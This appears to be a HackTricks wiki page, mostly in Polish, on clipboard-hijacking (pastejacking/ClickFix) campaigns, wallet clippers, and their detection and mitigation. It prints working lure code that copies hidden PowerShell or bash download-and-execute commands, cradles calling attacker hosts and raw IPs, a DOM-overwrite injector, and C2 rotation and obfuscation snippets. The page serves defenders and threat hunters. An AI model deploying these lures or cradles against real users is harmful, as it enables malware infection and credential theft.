# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nigdy nie wklejaj niczego, czego sam nie skopiowałeś." – stara, ale nadal aktualna rada

## Overview

Clipboard hijacking – znane też jako *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają komendy bez ich sprawdzania. Złośliwa strona internetowa (lub dowolny kontekst z obsługą JavaScript, taki jak aplikacja Electron lub Desktop) programowo umieszcza w systemowym clipboard tekst kontrolowany przez atakującego. Ofiary są zachęcane, zwykle poprzez starannie przygotowane instrukcje social-engineering, aby nacisnąć **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) albo otworzyć terminal i *wkleić* zawartość clipboard, co natychmiast wykonuje dowolne komendy.

Ponieważ **żaden plik nie jest pobierany i nie jest otwierany żaden załącznik**, technika omija większość zabezpieczeń e-mail i treści webowych, które monitorują załączniki, makra lub bezpośrednie wykonanie komend. Atak jest więc popularny w kampaniach phishing dostarczających commodity malware families, takich jak NetSupport RAT, Latrodectus loader lub Lumma Stealer.

## Wallet-address replacement clippers

Inny wariant **clipboard hijacking** nie wkleja w ogóle komend: czeka, aż ofiara skopiuje adres **cryptocurrency wallet**, a następnie po cichu podmienia go na adres kontrolowany przez atakującego tuż przed wklejeniem. Jest to szczególnie skuteczne przeciwko długim formatom wallet, ponieważ użytkownicy często sprawdzają tylko pierwszy/ostatni znak.

Typowe cechy z prawdziwych kampanii:
- **Thin loader + nested payload**: widoczna aplikacja/exe wygląda jak legalne narzędzie trading lub "profit", podczas gdy właściwy clipper jest ukryty głębiej w pakiecie (na przykład .NET loader uruchamiający zagnieżdżony payload Rust).
- **Regex-driven replacement**: malware dopasowuje ciągi takie jak `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, a nawet ogólne ciągi **44-znakowe podobne do Solana** i przepisuje je na wallet atakującego.
- **Wallet rotation at scale**: nowoczesne próbki Windows mogą osadzać **tysiące** wallet zastępczych dla każdej waluty zamiast jednego statycznego adresu, ograniczając zużycie reputacji wallet po każdym kradzieży.

### Windows clipper flow

Częstą implementacją jest ukryte okno zarejestrowane przy użyciu **`AddClipboardFormatListener`**. Przy każdej aktualizacji clipboard malware zwykle wywołuje:
- **`OpenClipboard`** → uzyskanie dostępu do bieżących danych clipboard.
- **`GetClipboardData`** → odczyt tekstu.
- **`EmptyClipboard`** + **`SetClipboardData`** → podmiana ciągu wallet na wartość atakującego.

Minimalne regexy hunting często spotykane w clipperach:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Uporczywość na poziomie użytkownika wystarcza do osiągnięcia skutku. Zaobserwowany wzorzec to:
- Skopiuj payload do **`%APPDATA%\silke\silke.exe`**
- Utwórz **Startup-folder LNK** w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Pomysły na detekcję:
- Procesy, które ciągle wywołują clipboard APIs, jednocześnie zapisując w `%APPDATA%` i folderze **Startup** użytkownika.
- Nowe tworzenie LNK/executable, po którym następują przepisywania adresu wallet w schowku.
- Archiwa lub fałszywe pakiety software zawierające wiele nieużywanych plików oraz mały launcher uruchamiający zagnieżdżony binary.

### macOS social-engineered removal quarantine + LaunchAgent persistence

Na macOS niektóre kampanie dostarczają pomocniczy plik **`unlocker.command`** i instruują ofiarę, aby kliknęła prawym przyciskiem myszy → **Open**, jeśli Gatekeeper mówi, że aplikacja jest uszkodzona albo pochodzi od niezidentyfikowanego developera. Skrypt po prostu usuwa quarantine i uruchamia pobliskie `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
To **nie jest** exploit Gatekeeper; to **social-engineered quarantine bypass** wykorzystujący fakt, że decyzje Gatekeeper zależą od atrybutu `com.apple.quarantine` xattr.

Po wykonaniu clipper może utrwalić się dla bieżącego użytkownika, zapisując:
- **`~/launch.sh`** – skrypt wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent z `RunAtLoad` i `KeepAlive`

Przydatnym szczegółem obronnym jest to, że niektóre próbki implementują **self-healing watchdog**, który przepisuje LaunchAgent i wrapper co około 30 sekund. Jeśli usuniesz plist najpierw **bez zabijania działającego procesu**, malware może natychmiast go odtworzyć. Bezpieczna kolejność czyszczenia:
1. Zakończ aktywny proces clippera.
2. Wyładuj/usuń plist LaunchAgent.
3. Usuń `~/launch.sh` i skopiowany payload.

### Delivery note: fake reputation as a force multiplier

W tej rodzinie samo malware może pozostać technicznie proste, podczas gdy **warstwa dystrybucji** wykonuje ciężką pracę: fałszywe gwiazdki/forki GitHub, recenzje/pobrania SourceForge, komentarze/wyświetlenia pod tutorialami YouTube oraz wyglądające na benign komentarze/głosy VirusTotal są używane, aby binarka przed wykonaniem wyglądała na zaufaną.

## Forced copy buttons and hidden payloads (macOS one-liners)

Niektóre macOS infostealers klonują strony instalatorów (np. Homebrew) i **wymuszają użycie przycisku “Copy”**, aby użytkownicy nie mogli zaznaczyć tylko widocznego tekstu. Wpis w clipboard zawiera oczekiwaną komendę instalacyjną plus dołączony payload Base64 (np. `...; echo <b64> | base64 -d | sh`), więc jedno wklejenie wykonuje oba etapy, podczas gdy UI ukrywa dodatkowy stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starsze kampanie używały `document.execCommand('copy')`, nowsze opierają się na asynchronicznym **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Użytkownik odwiedza typosquatted lub skompromitowaną stronę (np. `docusign.sa[.]com`)
2. Wstrzyknięty kod **ClearFake** JavaScript wywołuje helper `unsecuredCopyToClipboard()`, który po cichu zapisuje w schowku jednowierszowy skrypt PowerShell zakodowany w Base64.
3. Instrukcje HTML mówią ofierze, aby: *„Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
4. `powershell.exe` wykonuje się, pobierając archiwum, które zawiera legalny plik wykonywalny oraz złośliwą bibliotekę DLL (klasyczne DLL sideloading).
5. Loader odszyfrowuje kolejne etapy, wstrzykuje shellcode i instaluje persistence (np. scheduled task) – finalnie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legalny Java WebStart) przeszukuje swój katalog w poszukiwaniu `msvcp140.dll`.
* Złośliwy DLL dynamicznie rozwiązuje API za pomocą **GetProcAddress**, pobiera dwa binaria (`data_3.bin`, `data_4.bin`) przez **curl.exe**, odszyfrowuje je przy użyciu rolling XOR key `"https://google.com/"`, wstrzykuje końcowy shellcode i rozpakowuje **client32.exe** (NetSupport RAT) do `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Pobiera `la.txt` za pomocą **curl.exe**
2. Wykonuje downloader JScript wewnątrz **cscript.exe**
3. Pobiera payload MSI → zapisuje `libcef.dll` obok podpisanej aplikacji → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer poprzez MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** uruchamia ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, wyodrębnia `Boat.pst` (CAB), rekonstruuje `AutoIt3.exe` przez `extrac32` i konkatenację plików, a na końcu uruchamia skrypt `.a3x`, który eksfiltruje dane uwierzytelniające przeglądarki do `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Niektóre kampanie ClickFix całkowicie pomijają pobieranie plików i instruują ofiary, aby wkleiły jednolinijkowy ciąg, który pobiera i uruchamia JavaScript przez WSH, utrwala się, a C2 rotuje codziennie. Przykładowy zaobserwowany łańcuch:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Kluczowe cechy
- Obfuskowany URL odwracany w czasie wykonania, aby utrudnić pobieżną inspekcję.
- JavaScript utrwala się przez Startup LNK (WScript/CScript) i wybiera C2 na podstawie bieżącego dnia – umożliwiając szybką rotację domen.

Minimalny fragment JS używany do rotacji C2 według daty:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Następny etap zwykle wdraża loader, który ustanawia persistence i pobiera RAT (np. PureHVNC), często pinując TLS do hardcoded certificate i dzieląc ruch na chunki.

Pomysły na detection specyficzne dla tej odmiany
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (lub `cscript.exe`).
- Artefakty uruchamiania: LNK w `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wywołujący WScript/CScript z path JS w `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i telemetry command-line zawierające `.split('').reverse().join('')` lub `eval(a.responseText)`.
- Powtarzające się `powershell -NoProfile -NonInteractive -Command -` z dużym payloadem stdin, aby podawać długie skrypty bez długich command line.
- Scheduled Tasks, które następnie uruchamiają LOLBins, takie jak `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` pod task/path wyglądającym jak updater (np. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Codziennie rotujące hostnames C2 i URLs z patternem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Koreluj zdarzenia zapisu clipboarda, po których następuje wklejenie Win+R, a potem natychmiastowe uruchomienie `powershell.exe`.


Blue-teams mogą łączyć telemetry clipboard, process-creation i registry, aby precyzyjnie wykrywać abuse przez pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię komend z **Win + R** – szukaj nietypowych wpisów Base64 / obfuscated.
* Security Event ID **4688** (Process Creation), gdzie `ParentImage` == `explorer.exe` i `NewProcessName` w { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** dla tworzenia plików w `%LocalAppData%\Microsoft\Windows\WinX\` lub folderach tymczasowych tuż przed podejrzanym eventem 4688.
* Czujniki clipboard EDR (jeśli są dostępne) – koreluj `Clipboard Write`, po którym natychmiast pojawia się nowy proces PowerShell.

## Strony weryfikacyjne w stylu IUAM (ClickFix Generator): copy-to-console z clipboarda + payloady zależne od OS

Najnowsze kampanie masowo tworzą fałszywe strony weryfikacyjne CDN/browser ("Just a moment…", w stylu IUAM), które zmuszają użytkowników do kopiowania komend specyficznych dla OS z clipboarda do natywnych konsol. To przenosi wykonanie poza sandbox przeglądarki i działa zarówno na Windows, jak i macOS.

Kluczowe cechy stron generowanych przez builder
- Wykrywanie OS przez `navigator.userAgent`, aby dopasować payloady (Windows PowerShell/CMD vs. macOS Terminal). Opcjonalne decoy/no-op dla nieobsługiwanych OS, aby utrzymać iluzję.
- Automatyczne kopiowanie do clipboarda przy niewinnych akcjach UI (checkbox/Copy), podczas gdy widoczny tekst może różnić się od zawartości clipboarda.
- Blokada urządzeń mobilnych i popover z instrukcjami krok po kroku: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opcjonalna obfuscation i single-file injector do nadpisania DOM przejętej strony UI w stylu Tailwind (bez potrzeby rejestracji nowej domeny).

Przykład: mismatch clipboarda + branching zależny od OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Trwałość macOS początkowego uruchomienia
- Użyj `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, aby wykonanie było kontynuowane po zamknięciu terminala, zmniejszając widoczne artefakty.

Przejęcie strony na miejscu na skompromitowanych witrynach
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- Pomysły na detection i hunting specyficzne dla lures w stylu IUAM
- Web: Strony, które wiążą Clipboard API z widżetami weryfikacyjnymi; niezgodność między wyświetlanym tekstem a payloadem schowka; rozgałęzienie `navigator.userAgent`; Tailwind + pojedyncza podmiana strony w podejrzanych kontekstach.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` krótko po interakcji z przeglądarką; instalatory batch/MSI uruchamiane z `%TEMP%`.
- macOS endpoint: Terminal/iTerm uruchamiający `bash`/`curl`/`base64 -d` z `nohup` blisko zdarzeń w przeglądarce; background jobs przetrwające zamknięcie terminala.
- Skoreluj historię `RunMRU` Win+R i zapisy do clipboard z późniejszym utworzeniem procesu konsoli.

Zobacz też techniki wspierające

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake nadal kompromituje strony WordPress i wstrzykuje loader JavaScript, który łączy zewnętrzne hosty (Cloudflare Workers, GitHub/jsDelivr), a nawet wywołania blockchain „etherhiding” (np. POST do endpointów API Binance Smart Chain, takich jak `bsc-testnet.drpc[.]org`), aby pobrać aktualną logikę lure. Najnowsze overlaye mocno wykorzystują fake CAPTCHAs, które instruują użytkowników, aby skopiowali i wkleili jedną linijkę (T1204.004) zamiast cokolwiek pobierać.
- Początkowe execution jest coraz częściej delegowane do podpisanych hostów skryptów/LOLBAS. W 2026 chainach styczniowych wcześniejsze użycie `mshta` zostało zastąpione wbudowanym `SyncAppvPublishingServer.vbs` uruchamianym przez `WScript.exe`, z przekazaniem argumentów w stylu PowerShell z aliasami/wildcards, aby pobrać zdalną zawartość:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` jest podpisany i normalnie używany przez App-V; w połączeniu z `WScript.exe` i nietypowymi argumentami (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) staje się wysokosygnałowym etapem LOLBAS dla ClearFake.
- W lutym 2026 fałszywe payloads CAPTCHA wróciły do czystych PowerShell download cradles. Dwa aktywne examples:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- First chain is an in-memory `iex(irm ...)` grabber; the second stages via `WinHttp.WinHttpRequest.5.1`, writes a temp `.ps1`, then launches with `-ep bypass` in a hidden window.

Wskazówki detection/hunting dla tych wariantów
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domeny jsDelivr/GitHub/Cloudflare Worker, or raw IP `iex(irm ...)` patterns.
- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## Czerwiec 2026 ClickFix tradecraft: telemetria wklejania, fałszywe komentarze weryfikacyjne i chaining LOLBin

Najnowsza telemetria Red Canary pokazuje, że stabilny wskaźnik to **nie jedna dokładna komenda**, lecz połączenie **paste-and-run z udziałem użytkownika**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** i **natychmiastowe wykonanie**.

### Zauważalne wzorce operatorów

- **Paste confirmation telemetry**: niektóre payloady wywołują `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` przed właściwym stage. Potwierdza to interakcję użytkownika, jednocześnie utrzymując okno krótkim i cichym.
- **Fake verification comments**: PowerShell one-liners mogą dopisywać ciągi takie jak `# Security check ✔️ I'm not a robot Verification ID: 138105`, aby komenda nadal wyglądała na związaną z CAPTCHA po wklejeniu do Run / `cmd.exe` / historii PowerShell.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` unika statycznego URL w command line, a jednocześnie wykonuje download-and-execute w pamięci.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` nadużywa nietypowego casing i znaków podobnych do Unicode w flagach, aby łamać kruche detekcje, a jednocześnie przypominać `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` może ukrywać słowa kluczowe przez escape `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), uruchamiać zagnieżdżoną powłokę zminimalizowaną, zapisać content atakującego z benign extension, takim jak `.pdf`, a następnie wykonać go przez `mshta`.
## Mitigations

1. Browser hardening – wyłączyć clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) albo wymagać user gesture.
2. Security awareness – nauczyć użytkowników, aby *wpisywali* wrażliwe komendy albo najpierw wklejali je do text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, aby blokować arbitralne one-liners.
4. Network controls – blokować outbound requests do znanych domen pastejacking i malware C2.

## Related Tricks

* **Discord Invite Hijacking** często nadużywa tego samego podejścia ClickFix po zwabieniu użytkowników do złośliwego serwera:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
